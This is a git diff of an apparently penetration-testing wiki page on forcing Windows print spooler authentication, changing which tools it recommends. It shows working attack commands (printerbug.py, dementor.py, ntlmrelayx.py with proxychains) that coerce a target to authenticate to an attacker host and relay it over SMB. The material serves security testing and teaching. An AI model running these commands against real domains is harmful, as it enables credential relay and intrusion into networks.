@@ -16,17 +16,9 @@ The attacker needs a foothold on the domain (i.e. compromised account) for this 
 
 Remotely checking if the spooler is available can be done with [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) (Powershell) or with [rpcdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) (Python).
 
-The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) (Python), [dementor](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) (Python), the adapted original .NET code ([here](https://github.com/leechristensen/SpoolSample)).
+The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) or [SpoolSample](https://github.com/leechristensen/SpoolSample) (C#). There are many alternatives available publicly on the Internet.
 
 {% tabs %}
-{% tab title="dementor" %}
-Trigger the spooler service
-
-```bash
-dementor.py -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD $ATTACKER_IP $TARGET
-```
-{% endtab %}
-
 {% tab title="printerbug" %}
 Trigger the spooler service
 
@@ -55,7 +47,7 @@ In the situation where the tester doesn't have any credentials, it is still poss
 
 ```bash
 ntlmrelayx.py -t smb://$TARGET -socks
-proxychains dementor.py -d $DOMAIN -u $DOMAIN_USER $ATTACKER_IP $TARGET
+proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
 ```
 {% endtab %}
 {% endtabs %}
